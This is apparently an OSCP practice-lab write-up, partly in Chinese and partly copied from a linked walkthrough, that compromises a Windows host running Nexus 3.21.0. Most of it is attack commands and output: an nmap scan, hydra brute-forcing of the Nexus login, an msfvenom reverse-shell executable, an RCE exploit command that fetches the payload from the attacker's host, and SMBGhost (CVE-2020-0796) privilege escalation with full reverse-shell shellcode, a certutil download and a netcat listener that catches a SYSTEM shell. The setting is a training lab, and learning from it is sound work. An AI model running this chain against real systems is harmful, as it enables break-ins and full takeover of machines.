## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Medjed]
└─$ sudo nmap -A -sV -sS -T4 192.168.155.61
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-29 22:32 CST
Nmap scan report for 192.168.155.61
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: BaGet
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8081/tcp open  http          Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries
|_/repository/ /service/
|_http-title: Nexus Repository Manager
|_http-server-header: Nexus/3.21.0-05 (OSS)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/29%OT=21%CT=1%CU=37305%PV=Y%DS=4%DC=T%G=Y%TM=64EE01B
OS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=I%TS=U)OPS(O1=
OS:M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54EN
OS:NS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80
OS:%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7
OS:(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=92E1%RUD=G)
OS:IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-08-29T14:33:23
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   257.95 ms 192.168.45.1
2   257.95 ms 192.168.45.254
3   258.03 ms 192.168.251.1
4   258.13 ms 192.168.155.61

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.94 seconds
```

發現 8081 port 有跑 Nexus 3.21.0，其有個認證後的 RCE 漏洞，嘗試爆破服務帳密

先透過 cewl 建立客製字典檔

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Billyboss]
└─$ cewl http://192.168.155.61:8081/ | grep -v CeWL > wordlist.txt

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Billyboss]
└─$ cewl --lowercase http://192.168.155.61:8081/ | grep -v CeWL >> wordlist.txt

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Billyboss]
└─$ cat wordlist.txt
Nexus
Repository
Manager
Loading
new
Image
src
http
static
rapture
resources
favicon
ico
OSS
Product
Logo
Spinner
Browse
history
form
nexus
repository
manager
loading
new
image
src
http
static
rapture
resources
favicon
ico
oss
product
logo
spinner
browse
history
form
```

	重連 VPN，IP 換成 192.168.228.61

嘗試用 hydra 爆破成功！

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Billyboss]
└─$ hydra -I -L wordlist.txt -P wordlist.txt 192.168.228.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403' -f
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-30 22:10:09
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1600 login tries (l:40/p:40), ~100 tries per task
[DATA] attacking http-post-form://192.168.228.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403
[STATUS] 647.00 tries/min, 647 tries in 00:01h, 953 to do in 00:02h, 16 active
[8081][http-post-form] host: 192.168.228.61   login: nexus   password: nexus
[STATUS] attack finished for 192.168.228.61 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-30 22:11:24
```

將 credential 輸入 49385.py，先建立個 reverse shell elf file

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Billyboss]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LHOST=4444 -f exe -o reverse.exe
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

先嘗試下載 reverse shell

49385:
```json
URL='http://192.168.228.61:8081'
CMD='cmd.exe /c curl http://192.168.45.157/reverse.exe --output reverse.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

[WalkThrough](https://benheater.com/proving-grounds-billyboss/)

### Escalation

### Installed Patches Enumeration

Listing the installed KBs, we learn that the most recently installed patch is `KB4540673`. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list
wmic qfe list
Caption                                     CSName     Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=4552931  BILLYBOSS  Update                        KB4552931               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497165  BILLYBOSS  Update                        KB4497165               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497727  BILLYBOSS  Security Update               KB4497727                                    4/1/2019 
http://support.microsoft.com/?kbid=4537759  BILLYBOSS  Security Update               KB4537759               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4552152  BILLYBOSS  Security Update               KB4552152               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4540673  BILLYBOSS  Update                        KB4540673               BILLYBOSS\nathan     5/27/2020
```

### SMB Settings Enumeration

To further confirm the SMBGhost vulnerability, we check the listening ports and find that port 445 is open.

```

C:\Users\nathan\Nexus\nexus-3.21.0-05>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1788
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       808
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:8081           0.0.0.0:0              LISTENING       2076
...
```

### SMBGhost Exploitation

We'll use [this exploit](https://github.com/danigargu/CVE-2020-0796) against the SMB service. Starting with line 204 in **exploit.cpp**, we'll replace the shellcode with a reverse shell.

```
// Generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
uint8_t shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
    0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
    0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x91,0xc0,0xa8,0x31,0xb1,0x41,0x54,
    0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
    0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
    0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
    0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
    0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
    0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
    0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
    0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
    0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
    0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
    0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
    0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
    0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};
```

Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to `x64` and `Release` and compile the exploit. We can host the compiled exploit on our attack machine over HTTP and then download it to the target using the low-privileged shell.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil -urlcache -split -f http://192.168.118.3/cve-2020-0796-local.exe cve-2020-0796-local.exe
certutil -urlcache -split -f http://KALI/cve-2020-0796-local.exe cve-2020-0796-local.exe
****  Online  ****
  000000  ...
  01e600
CertUtil: -URLCache command completed successfully.
```

Let's start a Netcat handler to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```

We can now trigger the exploit.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>cve-2020-0796-local.exe
cve-2020-0796-local.exe
-= CVE-2020-0796 LPE =-
by @danigargu and @dialluvioso_

Successfully connected socket descriptor: 216
Sending SMB negotiation request...
Finished SMB negotiation
Found kernel token at 0xffffab002ca2c060
Sending compressed buffer...
SEP_TOKEN_PRIVILEGES changed
Injecting shellcode in winlogon...
Success! ;)
```

Our listener indicates we have obtained a SYSTEM shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.177.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.177.61] 49687
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```